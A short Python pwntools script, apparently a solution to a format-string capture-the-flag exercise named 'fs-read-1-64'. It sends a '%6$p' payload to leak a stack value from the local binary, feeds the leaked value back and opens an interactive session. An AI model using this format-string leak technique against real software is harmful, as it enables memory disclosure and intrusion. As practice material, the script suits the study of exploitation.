#!/usr/bin/env python
from pwn import *
i = 6
while True:
        p = process('fs-read-1-64')
        buf = '%'
        buf += str(i)
        buf += '$p'
        p.sendline(buf)
        p.readline()
        getdata = p.readline()
        print(getdata)
        print('sending ' + str(getdata[6:]))
        p.sendline(getdata[6:])
        i += 1
        p.interactive()
        p.close()
        if i > 6:
                exit()